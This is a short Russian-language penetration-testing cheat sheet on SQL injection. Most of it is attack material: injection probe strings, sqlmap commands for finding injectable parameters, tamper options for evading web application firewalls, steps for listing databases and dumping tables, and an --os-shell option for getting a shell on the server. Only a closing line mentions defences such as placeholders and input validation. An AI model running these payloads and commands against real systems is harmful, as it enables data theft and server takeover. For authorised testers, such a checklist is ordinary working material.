# SQL-инъекции
Когда: все формы и URL-параметры с вводом в БД.
Обнаружение: пробы ' / ' OR '1'='1 / 1' AND SLEEP(5)-- - / 1' ORDER BY 10-- -; sqlmap -u URL --batch --level 3 --risk 2; формы: --forms --batch; POST: -r request.txt; по сайту: --crawl=2 --smart.
WAF: --tamper=space2comment,between,randomcase; --delay=1.
Эксплуатация: --dbs → -D база --tables → -D база -T таблица --dump; --banner; --os-shell (осторожно). Blind: --technique=BT --time-sec=10.
Пруфы: URL, параметр, тип, версия СУБД, минимум данных. Защита: плейсхолдеры, валидация, права БД.